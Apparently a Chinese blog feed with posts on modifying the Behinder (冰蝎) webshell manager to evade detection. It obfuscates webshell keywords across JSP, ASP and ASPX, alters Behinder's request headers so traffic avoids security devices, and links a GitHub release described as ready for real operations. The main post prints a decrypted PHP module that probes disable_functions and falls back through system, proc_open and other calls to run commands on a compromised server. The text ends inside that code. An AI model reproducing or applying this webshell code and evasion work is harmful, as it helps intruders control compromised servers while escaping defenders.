简单使用了一下类、对关键字进行了chr的替换，jsp重写了base64编码方法，重写了加载aes，使用的反射型方法写的，对关键字进行替换，asp使用了chr进行替换关键字拼接字符串，换了一下函数的写法，aspx对关键函数拆开重写，并且将关键查杀函数重新写了一下。</p><h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>1.1版本添加木马的免杀，全语言都做好了，但是并没有改流量以及加密方式，只是做了伪装，<br>后面需要做的：修改一下加密方式，这样的话会更好一点。其他语言的 比如  jspx的 ，asmx的都没做，后面做。冰蝎4，是需要给到加密方式和解密方式的，我们想办法直接生成一个文件，里面包含免杀的木马，包含加解密方式，直接拿过来复制用即可，后面我们再来实现。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720160341116.png" alt="image-20250720160341116"></p><h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a><br>release 1.1 免杀版本，src代码也以上传，大家直接下载研究即可。<br>上个版本由于写的比较菜，没好意思跟大家要star，这次自我感觉还行，也算是实战能用了，如果感觉还凑合，大家帮忙点点star</p><h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。如果您感觉文章写的不错或者工具用起来还行，帮笔者点点stars、给公众号点点关注，先谢谢大家了。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder            原版behinder</span><br><span class="line">https://uuzdaisuki.com/2021/05/12/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/                   webshell免杀研究jsp篇</span><br><span class="line">https://www.secpulse.com/archives/193780.html        简单操作实现冰蝎jsp webshell 阿里云免杀 </span><br></pre></td></tr></table></figure><blockquote><p>emmm 太菜了<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> 二开 </tag>
            
            <tag> behinder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冰蝎二开从0到1</title>
      <link href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/"/>
      <url>/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<p>最近学习了一下冰蝎和哥斯拉的二开，但也只是学习了一丢丢皮毛，这里记录一下。</p><p>继上次二开哥斯拉后，已经过去了七个月了，项目收获了很多star，感谢大家。</p><p>上次我们已经对godzilla进行了二开，这次我们继续对冰蝎进行简单的二开。</p><h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><p>首先致敬一下原版冰蝎，原版地址<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p><p>我们这里使用的最新的[<a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91">Behinder_v4.1【t00ls专版】</a> <a href="https://github.com/rebeyond/Behinder/releases/latest">Latest</a>]版本，进行逆向及二开。虽然是4.1版本，但是本文还是在冰蝎3的木马上做研究。冰蝎因为涉及到自己设置加密解密脚本，我们将下篇文章进行研究。</p><p>反编译网址，<a href="https://www.decompiler.com/%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%96%E5%85%A5jar%E5%8C%85%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%BE%88%E6%96%B9%E4%BE%BF%E3%80%82">https://www.decompiler.com/，直接拖入jar包即可，很方便。</a></p><p>当然也可以使用idea的插件进行反编译，都一样。</p><p>ok开始</p><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>这里细节的反编译及配置就不在此文章中体现了，这里配置的过程和哥斯拉一模一样。有兴趣的同学可以回看之前的文章<a href="https://bohemian.top/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/">godzilla二开</a>学习。</p><p>只是接着添加主类不是哥斯拉的路径</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701203019979.png" alt="image-20250701203019979"></p><p>是在这个路径，这个路径实际上是自己出来的。</p><p>要将反编译的src\META-INF/MANIFEST.MF源文件，放到src下面，注意路径。这个主类的路径就自己出来了。</p><p>点击选中主类，我们既可以愉快的二开了。</p><h5 id="改标题"><a href="#改标题" class="headerlink" title="改标题"></a>改标题</h5><p>现在就可以编译了，我们先简单的改一下标题。</p><p>复制一份文件，冰蝎的标题在net/rebeyond/behinder/core/Constants.java复制src/net/rebeyond/behinder/core/Constants.java，没有的目录要创建一下。目录一定要对齐。这里一定要清楚，不要在原版的那个和编译的那些文件里改，想改什么，把目录对齐，创建复制文件。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701204109794.png" alt="image-20250701204109794"></p><p>这里就可以看到相关的参数了，随意更改，老样子，我们随便改一下就好。</p><p>然后build project  在build artifacts 就可以了。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701204905919.png" alt="image-20250701204905919"></p><p>这里有一点要注意，就是如果你运行生成好的jar，他说数据库未找到，</p><p>那么你需要编辑一下环境</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701205042896.png" alt="image-20250701205042896"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701205104146.png" alt="image-20250701205104146"></p><p>这个working directory需要设成你的生成文件的目录，这样，Behinder.Jar就能找到相关的数据库文件了，</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701205303687.png" alt="image-20250701205303687"></p><p>当然别忘了把Behinder自带的目录都挪过来。</p><h5 id="全局改造"><a href="#全局改造" class="headerlink" title="全局改造"></a>全局改造</h5><p>我们知道，godzilla和Behinder都有一些强特征，我们可以加一下混淆或者简单改改。</p><p>看网上一些大师傅分析的结果，似乎都比较久远（3.0），我们尝试分析一下。</p><p>冰蝎是没有像哥斯拉一样的测试按钮的，我们只能直接打开。</p><p>在我们直接打开后，会发现，有三个数据包</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701210316376.png" alt="image-20250701210316376"></p><p>我们先来看第一个包，我们就</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /rebeyond/mian2.php HTTP/1.1</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://192.168.133.128:11001/DR6D/NX.php</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36</span><br><span class="line">Content-Length: 3096</span><br><span class="line">Host: 192.168.133.128:11001</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">3Mn1yNMtoZViV5wotQHPJtww..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Tue, 01 Jul 2025 12:55:12 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Set-Cookie: PHPSESSID=ro9l5p843f3h6l9s30mcg8951c; path=/</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Length: 286</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这里可以看到请求包中有</p><p>Accept: application/json, text/javascript, <em>/</em>; q=0.01<br>Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7<br>Content-type: application/x-www-form-urlencoded<br>Referer: <a href="http://192.168.133.128:11001/DR6D/NX.php">http://192.168.133.128:11001/DR6D/NX.php</a><br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36</p><p>这些都是我们可以修改的，</p><p>在net/rebeyond/behinder/core/Constants.java</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701212418925.png" alt="image-20250701212418925"></p><p>可以看到相关的定义</p><p>Accept: application/json, text/javascript, <em>/</em>; q=0.01，表示客户端（例如浏览器或爬虫）告诉服务器：</p><blockquote><p>“我能接受这些类型的数据格式作为响应内容，按优先级排列如下。”</p></blockquote><ol><li><p><strong><code>application/json</code></strong></p><ul><li>客户端最希望服务器返回 JSON 格式的数据；</li><li>典型于前后端通信、Ajax 请求、API 接口调用。</li></ul></li><li><p><strong><code>text/javascript</code></strong></p><ul><li>如果不能返回 JSON，可以返回 JavaScript 脚本（例如 JSONP 响应）；</li><li>虽然现在 <code>application/javascript</code> 更标准，但 <code>text/javascript</code> 仍被广泛支持。</li></ul></li><li><p><strong><code>\*/\*; q=0.01</code></strong></p><ul><li><p><code>*/*</code> 意思是「任何其他类型都可以接受」；</p></li><li><p><code>q=0.01</code> 是质量因子（quality factor），表示优先级很低（取值范围是 0.0 ~ 1.0）；</p></li><li><p>这里的 <code>q=0.01</code> 表示除非前面都不满足，否则不考虑其他类型。</p></li></ul></li></ol><p>这里可以看到都是常用的Accept ，没有什么特殊的。</p><p>原版里面给了一个accept，有同学问，不是给了两个么，是的，给了两个，</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701214434071.png" alt="image-20250701214434071"></p><p>在同目录下的shellservice里面，作者定义了这个，最后一个永远不会被选中。我们给他加上，并且加几个字符串随机。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701215842183.png" alt="image-20250701215842183"></p><p>这样的话，就可以简单随机了，大概率感觉不会被设备标记，太普通了</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701220326930.png" alt="image-20250701220326930"></p><p>一般也都是这种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static String[] userAgents = new String[]&#123;&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&quot;, &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;&#125;;</span><br></pre></td></tr></table></figure><p>ua也定义了一下，看起来也都是一些常见的ua，我们直接给他换成我的edge，google，firefox的。</p><p>  public static String[] userAgents在这里修改就行。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701221207713.png" alt="image-20250701221207713"></p><p>Accept-Language这里也简单修改一下，</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701222840016.png" alt="image-20250701222840016"></p><p>大家仔细观察在上面bp图里面有一个Referer字段，这个字段是作者加的，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">private String getReferer() &#123;</span><br><span class="line">        String refer;</span><br><span class="line">        URL u = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            u = new URL(this.effectShellEntity.getString(&quot;url&quot;));</span><br><span class="line">            String oldPath = u.getPath();</span><br><span class="line">            String newPath = &quot;&quot;;</span><br><span class="line">            String ext = oldPath.substring(oldPath.lastIndexOf(&quot;.&quot;));</span><br><span class="line">            oldPath = oldPath.substring(0, oldPath.lastIndexOf(&quot;.&quot;));</span><br><span class="line">            String[] parts = oldPath.split(&quot;/&quot;);</span><br><span class="line">            for (int i = 0; i &lt; parts.length; ++i) &#123;</span><br><span class="line">                if (parts[i].length() == 0) continue;</span><br><span class="line">                if (new Random().nextBoolean()) &#123;</span><br><span class="line">                    int randomNum = new Random().nextInt(parts[i].length());</span><br><span class="line">                    if (randomNum == 0) &#123;</span><br><span class="line">                        randomNum = 4;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String randStr = new Random().nextBoolean() ? Utils.getRandomString(randomNum).toLowerCase() : Utils.getRandomString(randomNum).toUpperCase();</span><br><span class="line">                    newPath = newPath + &quot;/&quot; + randStr;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                newPath = newPath + &quot;/&quot; + parts[i];</span><br><span class="line">            &#125;</span><br><span class="line">            newPath = newPath + ext;</span><br><span class="line">            refer = this.currentUrl.replace(u.getPath(), newPath);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return this.currentUrl;</span><br><span class="line">        &#125;</span><br><span class="line">        return refer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701225252868.png" alt="image-20250701225252868"></p><p>响应的代码也是在shellservcie里，这一大段的意思就是，先获取根目录如Referer: <a href="http://192.168.133.128:11001/%EF%BC%8C%E7%84%B6%E5%90%8E%E9%9A%8F%E6%9C%BA%E5%8F%96%E5%87%A0%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%94%BE%E5%88%B0%E5%90%8E%E9%9D%A2%EF%BC%8C%E7%84%B6%E5%90%8E%E6%98%AF%E4%BB%80%E4%B9%88%E8%AF%AD%E8%A8%80%E7%9A%84%E8%84%9A%E6%9C%AC%E5%B0%B1%E5%8A%A0%E4%B8%80%E4%B8%8B%E9%9A%8F%E6%9C%BA%E5%87%A0%E4%B8%AA%E5%AD%97%E7%AC%A6.php%EF%BC%8C%E6%AF%8F%E6%AC%A1%E6%9B%BF%E6%8D%A2%E9%83%BD%E6%98%AF%E9%9A%8F%E6%9C%BA%E7%9A%84%EF%BC%8C%E5%8F%AF%E8%83%BD%E4%B8%8D%E6%9B%BF%E6%8D%A2%E6%88%91%E4%BB%AC%E5%BD%93%E5%89%8D%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E5%8F%AF%E8%83%BD%E9%83%A8%E6%9B%BF%E6%8D%A2shell%E5%90%8D%E5%AD%97%EF%BC%8C%E5%B0%B1%E5%83%8F%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7%E3%80%82">http://192.168.133.128:11001/，然后随机取几个字符，放到后面，然后是什么语言的脚本就加一下随机几个字符.php，每次替换都是随机的，可能不替换我们当前的目录，可能部替换shell名字，就像下面这样。</a></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701225830441.png" alt="image-20250701225830441"></p><p>如果我们把这个referer去掉，</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701225930317.png" alt="image-20250701225930317"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701230032932.png" alt="image-20250701230032932"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701230059005.png" alt="image-20250701230059005"></p><p>没有referer 也是正常使用的。</p><p>这里猜测作者是想通过referer 进行迷惑设备或者人，我们这里就先给他去掉吧。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701230330965.png" alt="image-20250701230330965"></p><p>在很多网站上我们都可以看到有referer ，这或许会成为检测的标准，或者不会，我们就先去掉吧，后面如果有需要，我们在进行重写。</p><p>到此，大概请求的header就差不多了，我看有大佬的文章说，有的Content-Length在5700左右</p><p>这个是没有问题的，我们来看一下流量。为什么会产生这个数字。</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702003623065.png" alt="image-20250702003623065"></p><p>冰蝎中每个语言都对应了模块</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702003654124.png" alt="image-20250702003654124"></p><p>这些模块就是  当我们打开冰蝎的黑框后，我们在命令执行这个页面执行命令，就会调用cmd模块的代码。</p><p>当我们执行ls后，</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702004017564.png" alt="image-20250702004017564"></p><p>先会发一个大包，aes解开后</p><p>需要解开一个base464，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSafeStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s1</span> = iconv(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$s0</span> = iconv(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$s1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s0</span> == <span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iconv(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$cmd</span>,<span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @set_time_limit(<span class="number">0</span>);</span><br><span class="line">    @ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    @ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$PadtJn</span> = @ini_get(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = preg_replace(<span class="string">&#x27;/[, ]+/&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span> !== strpos(strtolower(PHP_OS), <span class="string">&#x27;win&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$JueQDBH</span> = <span class="string">&#x27;is_callable&#x27;</span>;</span><br><span class="line">    <span class="variable">$Bvce</span> = <span class="string">&#x27;in_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;system&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;proc_open&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;proc_open&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$handle</span> = proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;r&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ), <span class="variable">$pipes</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (! feof(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$kWJW</span> .= fread(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;passthru&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;passthru&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;shell_exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;shell_exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = shell_exec(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="keyword">array</span>();</span><br><span class="line">        exec(<span class="variable">$c</span>, <span class="variable">$kWJW</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = join(chr(<span class="number">10</span>), <span class="variable">$kWJW</span>) . chr(<span class="number">10</span>);</span><br><span class="line">    &#125; 